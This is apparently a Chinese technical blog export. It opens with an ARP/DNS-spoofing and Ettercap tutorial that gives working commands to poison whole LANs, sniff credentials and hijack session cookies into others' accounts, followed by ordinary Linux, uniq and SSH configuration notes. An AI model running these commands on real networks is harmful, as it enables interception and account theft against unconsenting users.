在实现TCP/IP协议的网络环境下，一个ip包走到哪里，要怎么走是靠路由表定义，但是，当ip包到达该网络后，哪台机器响应这个ip包却是靠该ip包中所包含的硬件mac地址来识别。也就是说，只有机器的硬件mac地址和该ip包中的硬件mac地址相同的机器才会应答这个ip包，因为在网络中，每一台主机都会有发送ip包的时候，所以，在每台主机的内存中，都有一个 arp–&gt; 硬件mac 的转换表。通常是动态的转换表（该arp表可以手工添加静态条目）。也就是说，该对应表会被主机在一定的时间间隔后刷新。这个时间间隔就是ARP高速缓存的超时时间。通常主机在发送一个ip包之前，它要到该转换表中寻找和ip包对应的硬件mac地址，如果没有找到，该主机就发送一个ARP广播包，于是，主机刷新自己的ARP缓存。然后发出该ip包。在此推荐FB上的一篇文章: 中间人攻击-ARP毒化 常用软件： ARPspoof Cain&amp;abel Ettercap ARPoison Dsniff Parasite DNS欺骗： ​ 目标将其DNS请求发送到攻击者这里，然后攻击者伪造DNS响应，将正确的IP地址替换为其他IP，之后你就登陆了这个攻击者指定的IP，而攻击者早就在这个IP中安排好了一个伪造的网站如某银行网站，从而骗取用户输入他们想得到的信息，如银行账号及密码等，这可以看作一种网络钓鱼攻击的一种方式。对于个人用户来说，要防范DNS劫持应该注意不点击不明的连接、不去来历不明的网站、不要在小网站进行网上交易，最重要的一点是记清你想去网站的域名，当然，你还可以把你常去的一些涉及到机密信息提交的网站的IP地址记下来，需要时直接输入IP地址登录。在此还推荐FB上的一篇文章: 中间人攻击-DNS欺骗 ettercap​ PS：其实Linux下实施ARP攻击的软件不只有ettercap，也可以使用arpspoof，arpspoof比较简洁，参数也少，非常易用…不过要配合iptables来转发流量，不然目标会断网，ettercap自带转发功能，功能也比较全面因此使用比较多。 Ettercap支持对许多协议（包括加密协议）的主动和被动分离，并具有网络和主机分析方面的多项功能。Ettercap包含四种操作模式： 基于IP的模式：根据IP源和目的地过滤数据包 基于MAC的模式：根据MAC地址过滤数据包，该模式能够对嗅探通过网关的连接起到作用。 基于ARP的模式：利用ARP欺骗方式在两个主机之间的交换式局域网（全双工，即支持双方同时发送信息）上进行嗅探。 基于公共ARP的模式：利用ARP欺骗方式从一台受害者主机到其它所有主机的交换式局域网（全双工）上进行嗅探。 具体功能： 在已建立的连接中注入字符：将字符注入到服务器（模拟命令）或客户端（模拟回复），同时保持实时连接。 SSH1支持：嗅探用户名和密码，甚至是SSH1连接的数据。Ettercap是第一个能够以全双工方式嗅探SSH连接的软件。 HTTPS支持：嗅探HTTP SSL连接上的加密数据——通过Cisco路由器的GRE tunnel对远程流量进行嗅探，并对它进行”中间人攻击”。 插件支持：使用Ettercap的API创建自定义插件。 密码收集：可以收集以下协议的密码信息——TELNET、FTP、POP、IMAP、rlogin、SSH1、ICQ、SMB、MySQL、HTTP、NNTP、X11、Napster、IRC、RIP、BGP、SOCKS 5、IMAP 4、VNC、LDAP、NFS、SNMP、Half-Life、Quake 3MSN、YMSG 数据包过滤/丢弃：设置一个过滤器，用于在TCP或UDP有效内容中查找特定字符串（或十六进制序列），并用自定义字符串/序列替换它，或丢弃整个数据包。 操作系统指纹：可以提取受害主机及其网络适配器的操作系统信息。 终止连接：从connections-list（连接列表）中终止所选择的连接。 局域网的被动扫描：检索局域网上的主机信息、开放端口、可用服务的版本号、主机（网关、路由器或简单PC）的类型以及跃点数（跃点即路由，一个路由为一个跃点。传输过程中需要经过多个网络，每个被经过的网络设备点（有能力路由的）叫做一个跃点，地址就是它的ip。跃点数是经过了多少个跃点的累加器，为了防止无用的数据包在网上流散。 ）的预估距离。 劫持DNS请求。 Ettercap还具有主动或被动地在局域网中找到其它受感染者的功能。 ettercap 图形界面演示 在终端输入 ettercap -G 用于启动图形化界面 ， 并查看本机IP 与 MAC地址 ​ 进行网卡嗅探 Sniff -&gt; Unified sniffing -&gt; 选择网卡 -&gt; ok ​ 进行目标IP选取 Host -&gt; hosts list / 若足够ip 选择 scan for host 将攻击主机IP设置为TARGET1 ， 网关设置为TARGET2; 然后进行 sniff 嗅探 ​ 可以查看目标主机， 发现已经毒化成功 start -&gt; start sniffing 此时，目标主机的所有流量都将会通过本机(Kali)网卡，可以截取任意数据包。 ettercap 命令行1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495用法: ettercap [选项] [目标1] [目标2] 目标写法：(可以查看 man ettercap 获取更详细信息) 目标写法格式是： MAC/IPs/PORTs 。依照这个规则，我们把目标可以精确到特定的主机和端口上。MAC、IP、和PORT为三个条件，为空代表ANY。 \"//80\"即表示对任意MAC、任意IP上的80端口进行嗅探。一般来说，MAC部分留空，除非你愿意去手动输入那一长串的MAC地址。因此，我们可以只用IP部分来确定目标主机。 注意：如果 IPv6 启用，目标是 MAC/IPs/IPv6/PORTs 这种形式。 即 mac地址，ip地址，端口号中间用 \"/\" 符号隔开，留空不写表示 “ANY”，即所有。 当IP有多个的时候，可以用英文\",\"分隔不同的C段ip。可以用\"-\"表示连续的ip。可以用\";\"分隔不同表达形式的ip。 举例如下：\"10.0.0.1-5;10.0.1.33\" 表示 ip 10.0.0.1, 2, 3, 4, 5 和 10.0.1.33 端口部分也有类似的写法，看例子：\"20-25,80,110\" 表示 20, 21, 22, 23, 24, 25, 80 和 110 例如: /192.168.1.1/ 表示 192.168.1.1 的所有端口号 aa:bb:cc:dd:ee:ff//80 表示 aa:bb:cc:dd:ee:ff 的80端口. 其中多个mac地址用英文符号分号 ';' 隔开。 多个ip地址和端口号可以用符号 '-' 表示连续 和 英文符号分号 ';' 隔开； e.g. \"10.0.0.1-5;10.0.1.33\" 表示 10.0.0.1, 2, 3, 4, 5 和 10.0.1.33 \"20-25,80,110\" 表示 20, 21, 22, 23, 24, 25, 80 和 110 /192.168.1.100-120;192.168.2.130/ 表示 /192.168.1.100,101,102,103,～～120;192.168.12.130/ 这两个目标是为了过滤从一个到另一个之间的流量，反之亦然(因为连接是双向的)。 \"//80\" 表示任意MAC地址，任意 IP ,但是端口是80 的目标。 \"/10.0.0.1/\" 表示任意 MAC地址，IP是10.0.0.1，任意端口 的 目标 \"//\" 表示 \"子网中所有主机\"。 注意: 可以在命令行用 -R 选项 反向 匹配 目标. So if you want to sniff 如果要嗅探除了10.0.0.1目标的所有进出流量。可以这样写：\"./ettercap -R /10.0.0.1/\" 注意: 目标也就是对局域网初始扫描扫描的主机。你可以通过netmask来限制只扫描网络中的一部分主机。 结果是扫描两部分目标后后并的结果。还记得没有指定目标就意味着“没有目标”，但是指定“//”意味着“子网中的所有主机”。 嗅探 和 攻击 选项: -M, --mitm &lt;method:args&gt; 中间人攻击，即两台终端间进行欺骗。(后面跟的参数可以参看 man ettercap) -o, --only-mitm 不嗅探，只执行中间人攻击 -b, --broadcast 嗅探广播数据包 -B, --bridge &lt;IFACE&gt; 使用桥接嗅探 (需要2个网络接口)。即 双网卡之间进行欺骗 -p, --nopromisc 不把网络接口设置成混杂模式 -S, --nosslmitm 不伪造SSL证书。即不使用ssl中间人攻击 -u, --unoffensive 不转发数据包 -r, --read &lt;file&gt; 从 pcapfile &lt;file&gt; 读取数据 -f, --pcapfilter &lt;string&gt; set the pcap filter &lt;string&gt; -R, --reversed 反转目标匹配。(即 匹配所有和目标不匹配的) -t, --proto &lt;proto&gt; 设置要嗅探的协议(默认嗅探所有) --certificate &lt;file&gt; ssl中间人攻击使用指定的 证书文件 --private-key &lt;file&gt; ssl中间人攻击使用指定的 私钥文件 运行界面类型: -T, --text 文本模式显示 -q, --quiet 安静模式，不显示嗅探数据 -s, --script &lt;CMD&gt; 加载脚本 -C, --curses curses-UI模式 -D, --daemon 守护模式(后台模式)(no GUI) -G, --gtk GTK-UI模式 日志记录选项: -w, --write &lt;file&gt; 把嗅探到的数据写入到 pcapfile &lt;file&gt; -L, --log &lt;logfile&gt; 把所有数据包保存&lt;logfile&gt;日志文件中 -l, --log-info &lt;logfile&gt; 仅仅记录被动信息到这个&lt;logfile&gt;日志文件中 -m, --log-msg &lt;logfile&gt; 将所有的消息记录到这个&lt;logfile&gt;日志中。 -c, --compress 使用gzip压缩日志文件 可视化选项: -d, --dns 把IP地址解析成主机名 -V, --visual &lt;format&gt; 显示方式 -e, --regex &lt;regex&gt; 使用一个正则表达式 -E, --ext-headers 为每个pck打印扩展标题 -Q, --superquiet 超级安静模式，啥信息都不显示，只保存 LUA脚本 选项: --lua-script &lt;script1&gt;,[&lt;script2&gt;,...] 使用逗号分割lua脚本 --lua-args n1=v1,[n2=v2,...] 使用逗号分割传给lua脚本的参数 通用基本选项: -i, --iface &lt;iface&gt; 指定网络接口 -I, --liface 显示所有网络接口 -Y, --secondary &lt;ifaces&gt; 后备网卡 -n, --netmask &lt;netmask&gt; 在网络接口上强制使用这个 &lt;netmask&gt; 网络掩码 -A, --address &lt;address&gt; ip地址，针对一网卡多ip的情况 -P, --plugin &lt;plugin&gt; 载入插件 -F, --filter &lt;file&gt; 载入过滤器文件 (content filter) -z, --silent 不进行arp毒化和主机扫描 -6, --ip6scan 在链路上发送 ICMPv6 探测和发现 IPv6 节点 -j, --load-hosts &lt;file&gt; 从文件中载入主机列表 -k, --save-hosts &lt;file&gt; 保存主机列表到文件中 -W, --wifi-key &lt;wkey&gt; 载入 WIFI 密码(wep或wpa) -a, --config &lt;config&gt; 载入并使用一个非默认配置文件 标准选项: -v, --version 打印版本信息并退出 -h, --help 显示帮助信息 UNIFIED 运行模式UNIFIED的方式是以中间人方式嗅探； 1234UNIFIED方式是同时欺骗A和B，把原本要发给对方的数据包发送到第三者C上，然后由C再转发给目标。 这样C就充当了一个中间人的角色。因为数据包会通过C那里，所以C可以对数据包进行分析处理，导致了原本只属于A和B的信息泄露给了C。 UNIFIED方式将完成以上欺骗并对数据包分析。 Ettercap劫持的是A和B之间的通信，在Ettercap眼中，A和B的关系是对等的。 BRIDGED 运行模式BRIDGED方式是在双网卡情况下，嗅探两块网卡之间的数据包； 12BRIDGED方式 有点像笔记本电脑上有两个网卡，一个有线网卡一个无线网卡。可以将有线网卡的internet连接共享给无线网卡，这样笔记本就变成了一个无线ap。 无线网卡产生的所有数据流量都将传送给有线网卡。BRIDGED方式ettercap嗅探的就是这两块网卡之间的数据包。 一般而言，我们会使用UNIFIED 方式。 其运行参数为-M (MITM的首字母) 12345678Ettercap，它相当于ARP病毒和密码嗅探界的瑞士军刀。通常在非互动模式中使用它，但是默认情况下它的交互界面非常友好，使用起来很方便。 如果我们的目标是网络上的所有主机，想要嗅探每个节点之间的所有传输，我们可以用下列命令： ettercap -T -q -M ARP // // 你应当谨慎的使用上面那段命令，因为如果把一个大网络中所有的传输都通过一台很慢的计算机的话，那么这很有可能使整个网络连接瘫痪。 可以找个替罪羊，来看看 Ip 地址为 192.168.1.1 的主机，我们可以使用如下命令：ettercap -T -q -M ARP /192.168.1.1/ // 如果192.168.1.1是网关，我们应该可以看到所有的输出传输。下面是这些命令行选项的功能： -T 告诉Ettercap使用文字界面，我最喜欢这个选项，因为GUI模式太复杂了。 -q 让Ettercap安静些，换句话说就是少些冗长的文字报告。 -M 让Ettercap我们想要使用的MITM（人参与其中）方式，本例中是ARP病毒。 常用组合1234567891011121314151617181920212223242526272829303132333435#arp毒化eth0所在的网段，安静模式文本显示 ettercap -Tqi eth0 -M ARP // // #监听10.0.0.1的ftp，ssh，telnet信息,并保存到本地 ettercap -Tzq /10.0.0.1/21,22,23 -w hack.pcap #对192.168.1.120进行dns欺骗，使用默认网卡eth0,文本模式安静显示 ettercap -Tq -P dns_spoof -M arp /192.168.1.120/ // #使用过滤并监听10.0.0.2在80端口的所有通信，安静模式文本显示，保存数据到本地 ettercap -Tqi eth0 -L sniffed_data -F filter.ef -M arp:remote /10.0.0.2/80 // 在控制台模式下（-T）不使用混杂模式（-p），你只会看到自己的通信。 ettercap -Tp 在控制台模式下(-T)，不使用ARP初始化（-z）,不显示数据包内容(-q安静模式)，但是会显示用户名和密码和其他消息。 ettercap -Tzq 在控制台模式下（-T），加载主机列表（-j），对目标执行arp毒化中间人攻击（-M arp） ettercap -T -j /tmp/victims -M arp /10.0.0.1-7/ /10.0.0.10-20/ 在控制台模式下（-T），对整个局域网执行ARP毒化攻击（-M arp） ettercap -T -M arp // // 在控制台模式下（-T），执行ARP双向欺骗（-M arp:remote） ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.2-10/ 在控制台模式下（-T），不使用ARP初始化（-z），使用安静模式（-q），监听所有主机110端口（pop3协议端口） ettercap -Tzq //110 在控制台模式下（-T），不进行ARP初始化（-z），使用安静模式（-q），监听目标10.0.0.1的21，22，23端口（FTP、SSH、TELNET） ettercap -Tzq /10.0.0.1/21,22,23 打印输出可用插件列表。 ettercap -P list 演示命令1ettercap -i eth0 -Tq -M arp:remote /192.168.2.253/ /192.168.2.1/ ##双向欺骗局域网内192.168.2.253 和 192.168.2.1 ARP 会话劫持​ 无论使用什么工具进行arp毒化， 我们的目的都是使目标主机的流量经过我们的网卡，即我们能使用tcpdump进行监听eth0 网卡，来捕捉网卡数据。 1tcpdump -i eth0 -w eth0.cap // 进行保存捕获内容 ，使用wireshark进行显示，抓取数据 打开wireshark分析捕获到的数据包分析，使用过滤语法，找出含有cookies的数据包: http.cookie 复制出cookies的值，并在浏览器中利用，这里推荐一款好用的cooikes利用工具cookie-injecting-tools（地址：https://github.com/lfzark/cookie-injecting-tools）。利用成功后，刷新页面，就可以进入到被人的主页和网盘了; Waring123456root@Kali:~# ettercap -i eth0 -Tq -M arp:remote /192.168.2.1/ /*/ettercap 0.8.2 copyright 2001-2015 Ettercap Development TeamIncorrect number of token (///) in TARGET !! 修改 1ettercap -i eth0 -Tq -M arp:remote /192.168.2.253// /192.168.2.1// 12You are very close. Compare the token /// in the error message and your token: //.Your version of ettercap is just IPv6 enabled. Hence the target definition gets one more part for the IPv6 address.","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/渗透/"},{"name":"Kali","slug":"Kali","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kali/"}]},{"title":"Linux 环境变量","slug":"commands/Linux-环境变量","date":"2018-03-27T12:08:19.000Z","updated":"2018-12-05T11:01:26.025Z","comments":true,"path":"2018/03/27/commands/Linux-环境变量/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/03/27/commands/Linux-环境变量/","excerpt":"Shell环境变量设置 set/env/export unset readonly 配置文件 Shell变量","text":"Shell环境变量设置 set/env/export unset readonly 配置文件 Shell变量 set/env/export set 显示(设置) shell变量 包括的私有变量以及用户变量， 不同类的shell有不同的私有变量， bash， ksh，zsh等私有变量是不同的。 env 显示(设置) 用户变量 export 显示(设置)当前导出用户变量的shell变量 12345678910[oracle@zhou3 ~]$ aaa=bbb --shell变量设定 [oracle@zhou3 ~]$ echo $aaa bbb [oracle@zhou3 ~]$ env| grep aaa --设置完当前用户变量并没有 [oracle@zhou3 ~]$ set| grep aaa --shell变量有 aaa=bbb [oracle@zhou3 ~]$ export| grep aaa --这个指的export也没导出，导出变量也没有 [oracle@zhou3 ~]$ export aaa --那么用export 导出一下 [oracle@zhou3 ~]$ env| grep aaa --发现用户变量内存在了 aaa=bbb unsetunset 命令来清除环境变量， set、env、export都可以用unset来清除。 1234567清除环境变量的值用unset命令。如果未指定值，则该变量值将被 设为NULL。示 例如下： $ export TEST=&quot;Test...&quot; #增加一个环境变量TEST $ env|grep TEST #此命令有输入，证明环境变量TEST已经存在了 TEST=Test... $ unset $TEST #删除环境变量TEST $ env|grep TEST #此命令没有输出，证明环境变量TEST已经不存在了 readonly1234567使用了readonly命令的话，变量就不可以被修改或清除了。示例如下： $ export TEST=&quot;Test...&quot; #增加一个环境变量TEST $ readonly TEST #将环境变量TEST设为只读 $ unset TEST #会发现此变量不能被删除 -bash: unset: TEST: cannot unset: readonly variable $ TEST=&quot;New&quot; #会发现此也变量不能被修改 -bash: TEST: readonly variable 配置文件 ~/.bash_profile 用户登录时被读取，其中包含的命令被执行 ~/.bashrc 启动新的shell时被读取，并执行 ~/.bash_logout shell 登录退出时被读取 shell初始化过程: bash 检查文件/etc/profile 是否存在 如果存在，bash 就读取该文件，否则，跳过 bash 检查主目录下的文件.bash_profile 是否存在。 如果存在，bash 就读取該文件，否则，跳过 bash 检查主目录下的.bash_login 是否存在。 如果存在，bash 就读取该文件，否则，跳过。 bash 检查主目录下的文件.profile 是否存在 如果存在， bash 就读取该文件，否则，跳过。 这些步骤都执行完后，就出现提示符了， ksh 默认提示符是 $. 常见shell变量12345678910111213141516171819PATH 这个变量包含了一系列由冒号分隔开的目录，系统就从这些目录里寻找可执行文件。如果你输入的可执行文件（例如ls、rc-update或者emerge） 不在这些目录中，系统就无法执行它（除非你输入这个命令的完整路径，如/bin/ls）。 ROOTPATH 这个变量的功能和PATH相同，但它只罗列出超级用户（root）键入命令时所需检查的目录。 LDPATH 这个变量包含了一系列用冒号隔开的目录，动态链接器将在这些目录里查找库文件。 MANPATH 这个变量包含了一系列用冒号隔开的目录，命令man会在这些目录里搜索man页面。 INFODIR 这个变量包含了一系列用冒号隔开的目录，命令info将在这些目录里搜索info页面。 PAGER 这个变量包含了浏览文件内容的程序的路径（例如less或者more）。 EDITOR 这个变量包含了修改文件内容的程序（文件编辑器）的路径（比如nano或者vi）。 KDEDIRS 这个变量包含了一系列用冒号隔开的目录，里面放的是KDE相关的资料。 CONFIG_PROTECT 这个变量包含了一系列用空格隔开的目录，它们在更新的时候会被Portage保护起来。 CONFIG_PROTECT_MASK 这个变量包含了一系列用空格隔开的目录，它们在更新的时候不会被Portage保护起来。 1234567891011PATH：决定了shell将到哪些目录中寻找命令或程序HOME：当前用户主目录MAIL：是指当前用户的邮件存放目录。SHELL：是指当前用户用的是哪种Shell。HISTSIZE：是指保存历史命令记录的条数LOGNAME：是指当前用户的登录名。 HOSTNAME：是指主机的名称，许多应用程序如果要用到主机名的话，通常是从这个环境变量中来取得的。LANG/LANGUGE：是和语言相关的环境变量，使用多种语言的用户可以修改此环境变量。 PS1：是基本提示符，对于root用户是#，对于普通用户是$。PS2：是附属提示符，默认是“&gt;”。可以通过修改此环境变量来修改当前的命令符，比如下列命令会将提示符修改成字符串“Hello,My NewPrompt :) ”。 # PS1=&quot; Hello,My NewPrompt :) &quot;","categories":[{"name":"linux环境","slug":"linux环境","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/linux环境/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"Linux uniq","slug":"commands/Linux-uniq","date":"2018-03-20T14:14:07.000Z","updated":"2018-12-05T11:00:20.681Z","comments":true,"path":"2018/03/20/commands/Linux-uniq/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/03/20/commands/Linux-uniq/","excerpt":"uniquniq 在读取行时会对它们进行比较并将只除去两个或更多的连续行","text":"uniquniq 在读取行时会对它们进行比较并将只除去两个或更多的连续行 参数12345678910111213141516-c, --count prefix lines by the number of occurrences-d, --repeated only print duplicate lines, one for each group-D print all duplicate lines --all-repeated[=METHOD] like -D, but allow separating groups with an empty line; METHOD=&#123;none(default),prepend,separate&#125;-f, --skip-fields=N avoid comparing the first N fields --group[=METHOD] show all items, separating groups with an empty line; METHOD=&#123;separate(default),prepend,append,both&#125;-i, --ignore-case ignore differences in case when comparing-s, --skip-chars=N avoid comparing the first N characters-u, --unique only print unique lines-z, --zero-terminated line delimiter is NUL, not newline-w, --check-chars=N compare no more than N characters in lines --help display this help and exit --version output version information and exit 最为常用的即为: -c -u -d 示例1234567root@Kali:~# cat uniqfile 12334123341234567Hello,world12345671234567 Uniq 使用去除连续重复行12345root@Kali:~# uniq uniqfile 123341234567Hello,world1234567 -c 参数 显示连续个数12345root@Kali:~# uniq -c uniqfile 2 12334 1 1234567 1 Hello,world 2 1234567 -d 参数 显示重复行123root@Kali:~# uniq -d uniqfile 123341234567 -u 参数 显示唯一123root@Kali:~# uniq -u uniqfile 1234567 ## 实际还是重复，但是不连续，因此需要配合sortHello,world 配合 sort 去除所有重复行123456789101112131415161718192021222324252627root@Kali:~# sort uniqfile 1233412334123456712345671234567Hello,worldroot@Kali:~# sort uniqfile | uniq -c ## 存在个数 2 12334 3 1234567 1 Hello,worldroot@Kali:~# sort uniqfile | uniq -uHello,world ## 唯一root@Kali:~# sort uniqfile | uniq -d ##输出重复123341234567root@Kali:~# sort uniqfile |uniq ## 即可进行重定向输出123341234567Hello,world","categories":[{"name":"命令","slug":"命令","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"SSH 公钥登陆服务器","slug":"commands/SSH-公钥登陆服务器","date":"2018-03-13T13:32:04.000Z","updated":"2018-12-05T13:56:14.784Z","comments":true,"path":"2018/03/13/commands/SSH-公钥登陆服务器/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/03/13/commands/SSH-公钥登陆服务器/","excerpt":"​ 密钥形式登录的原理是: ​ 利用密钥生成器制作一对密钥——一只公钥和一只私钥。将公钥添加到服务器的某个账户上，然后在客户端利用私钥即可完成认证并登录。这样一来，没有私钥，任何人都无法通过 SSH 暴力破解你的密码来远程登录到系统。","text":"​ 密钥形式登录的原理是: ​ 利用密钥生成器制作一对密钥——一只公钥和一只私钥。将公钥添加到服务器的某个账户上，然后在客户端利用私钥即可完成认证并登录。这样一来，没有私钥，任何人都无法通过 SSH 暴力破解你的密码来远程登录到系统。 公钥私钥生成ssh-keygen命令专门是用来生成密钥的。该命令有很多选项，这里列出了最基本的四个： -t 用来指定密钥类型（dsa | ecdsa | ed25519 | rsa | rsa1）; -P 用来指定密语 -f 用来指定生成的密钥文件名 -C 用来添加注释 -b 指定长度 ssh-keygen -t rsa -P 123456 -f host -b 4096 -C &#39;my host key&#39;意思就是新建了密语为123456注释为my host key文件名为host的密钥。此命令会生成host和host.pub两个文件，前者为私钥文件，后者为公钥文件。如果你想免密登录的话，请将密语设置为空。 示例:1234567891011121314151617181920212223242526Postgres@sucro109:~/.ssh$ lsknown_hostsPostgres@sucro109:~/.ssh$ ssh-keygen Generating public/private rsa key pair.Enter file in which to save the key (/home/Postgres/.ssh/id_rsa): ## 指定文件名称Enter passphrase (empty for no passphrase): ## 填写保护密码, 直接回车,即可实现无密码登陆Enter same passphrase again: ## 再次确认Your identification has been saved in /home/Postgres/.ssh/id_rsa. ## 秘钥Your public key has been saved in /home/Postgres/.ssh/id_rsa.pub. ## 公钥The key fingerprint is:88:2b:e7:45:51:1b:0a:b1:b7:39:64:18:69:23:99:44 Postgres@sucro109The key&apos;s randomart image is:+--[ RSA 2048]----+| oEo+o o || + += o o || oo.* . || = = || . * S || o . || . o . || + . || . |+-----------------+Postgres@sucro109:~/.ssh$ Postgres@sucro109:~/.ssh$ lsid_rsa id_rsa.pub known_hosts 将公钥上传服务器上传方式: ssh-copy-id ssh-copy-id [-i [identity_file]] [user@]machine -i 指定公钥文件 scp ​ rsync 将其公钥存放至 ~/.ssh/authorized_keys中 ; 如果文件名不想使用可以通过 AuthorizedKeysFile .ssh/authorized_keys 来重新指定文件名 再次上传其他主机公钥时， 追加到该文件即可. 设置SSH，打开秘钥登陆vi /etc/ssh/sshd_config ： 123RSAAuthentication yes ## #是否允许使用纯 RSA 公钥认证。PubkeyAuthentication yes ## 是否允许公钥认证。仅可以用于SSH-2。AuthorizedKeysFile .ssh/authorized_keys ## 公钥文件 注意root用户是否登陆： 1PermitRootLogin yes 禁止密码登陆: 1PasswordAuthentication no ## 是否允许使用基于密码的认证。 重启服务: 1service sshd restart 客户端链接​ 本人是通过ssh命令来远程连接服务器的，通过ssh -p your_port username@domain -i your_private_certification命令，就可以连接到服务器了。如果你是通过xshell或者putty来连接的话，导入你的私钥并连接就可以了。 异常1234567891011 4 -rw-r--r-- 1 root root 3311 Apr 19 05:27 id_rsa_4096_45.78.55.192_privateroot@Kali:~# ssh -i ./id_rsa_4096_45.78.55.192_private -p 28392 root@45.78.55.192@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ WARNING: UNPROTECTED PRIVATE KEY FILE! @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Permissions 0644 for &apos;./id_rsa_4096_45.78.55.192_private&apos; are too open.It is required that your private key files are NOT accessible by others.This private key will be ignored.Load key &quot;./id_rsa_4096_45.78.55.192_private&quot;: bad permissionsroot@45.78.55.192: Permission denied (publickey,gssapi-keyex,gssapi-with-mic). 解决办法： 123chmod 600 id_rsa_4096_45.78.55.192_private root@Kali:~# ssh -i id_rsa_4096_45.78.55.192_private -p 28392 root@45.78.55.192Enter passphrase for key &apos;id_rsa_4096_45.78.55.192_private&apos;:","categories":[{"name":"SSH","slug":"SSH","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/SSH/"},{"name":"工具篇","slug":"SSH/工具篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/SSH/工具篇/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"SSH_config_file","slug":"commands/SSH-config-file","date":"2018-03-12T13:43:50.000Z","updated":"2018-12-05T13:56:02.271Z","comments":true,"path":"2018/03/12/commands/SSH-config-file/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2018/03/12/commands/SSH-config-file/","excerpt":"SSH 配置文件解析","text":"SSH 配置文件解析 sshd_config123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103# $OpenBSD: sshd_config,v 1.93 2014/01/10 05:59:19 djm Exp $# This is the sshd server system-wide configuration file. See# sshd_config(5) for more information.# This sshd was compiled with PATH=/usr/local/bin:/usr/bin# The strategy used for options in the default sshd_config shipped with# OpenSSH is to specify options with their default value where# possible, but leave them commented. Uncommented options override the# default value.# If you want to change the port on a SELinux system, you have to tell# SELinux about this change.# semanage port -a -t ssh_port_t -p tcp #PORTNUMBER#Port 22 #设置ssh监听的端口号，默认22端口ListenAddress ::ListenAddress 0.0.0.0 #指定监听的地址，默认监听所有；Protocol 2,1 #指定支持的SSH协议的版本号。'1'和'2'表示仅仅支持SSH-1和SSH-2协议。#\"2,1\"表示同时支持SSH-1和SSH-2协议。#HostKey /etc/ssh/ssh_host_rsa_keyHostKey /etc/ssh/ssh_host_dsa_keyHostKey /etc/ssh/ssh_host_ecdsa_keyHostKey /etc/ssh/ssh_host_ed25519_key #HostKey是主机私钥文件的存放位置; #SSH-1默认是 /etc/ssh/ssh_host_key 。SSH-2默认是 /etc/ssh/ssh_host_rsa_key和#/etc/ssh/ssh_host_dsa_key 。一台主机可以拥有多个不同的私钥。\"rsa1\"仅用于SSH-1，#\"dsa\"和\"rsa\"仅用于SSH-2。UsePrivilegeSeparation yes #是否通过创建非特权子进程处理接入请求的方法来进行权#限分 离。默认值是\"yes\"。 认证成功后，将以该认证用户的身份创另一个子进程。这样做的目的是#为了防止通过有缺陷的子进程提升权限，从而使系统更加安全。KeyRegenerationInterval 3600 #在SSH-1协议下，短命的服务器密钥将以此指令设置的时#间为周期(秒)，不断重新生成；这个机制可以尽量减小密钥丢失或者黑客攻击造成的损失。设为 0 #表示永不重新生成为 3600(秒)。ServerKeyBits 1024 #指定服务器密钥的位数SyslogFacility AUTH #指定 将日志消息通过哪个日志子系统(facility)发送。有效值是：#DAEMON, USER, AUTH(默认), LOCAL0, LOCAL1, LOCAL2, LOCAL3,LOCAL4, LOCAL5, #LOCAL6, LOCAL7LogLevel INFO #指定日志等级(详细程度)。可用值如下:QUIET, FATAL, ERROR, INFO#(默认), VERBOSE, DEBUG, DEBUG1, DEBUG2, DEBUG3,DEBUG 与 DEBUG1 等价；DEBUG2# 和 DEBUG3 则分别指定了更详细、更罗嗦的日志输出。比 DEBUG 更详细的日志可能会泄漏用户# 的敏感信息，因此反对使用。LoginGraceTime 120 #限制用户必须在指定的时限(单位秒)内认证成功，0 表示无限制。默认#值是 120 秒;如果用户不能成功登录，在用户切断连接之前服务器需要等待120秒。PermitRootLogin yes #是否允许 root 登录。可用值如下：\"yes\"(默认) 表示允许。#\"no\"表示禁止。\"without-password\"表示禁止使用密码认证登录。\"forced-commands-only\"#表示只有在指定了 command 选项的情况下才允许使用公钥认证登录，同时其它认证方法全部被禁止。#这个值常用于做远程备份之类的事情。StrictModes yes #指定是否要求 sshd(8) 在接受连接请求前对用户主目录和相关的配#置文件 进行宿主和权限检查。强烈建议使用默认值\"yes\"来预防可能出现的低级错误。RSAAuthentication yes #是否允许使用纯 RSA 公钥认证。仅用于SSH-1。默认值是\"yes\"。PubkeyAuthentication yes #是否允许公钥认证。仅可以用于SSH-2。默认值为\"yes\"。IgnoreRhosts yes #是否取消使用 ~/.ssh/.rhosts 来做为认证。推荐设为yes。RhostsRSAAuthentication no #这个选项是专门给 version 1 用的，使用 rhosts 档案在 #/etc/hosts.equiv配合 RSA 演算方式来进行认证！推荐no。HostbasedAuthentication no #这个与上面的项目类似，不过是给 version 2 使用的IgnoreUserKnownHosts no #是否在 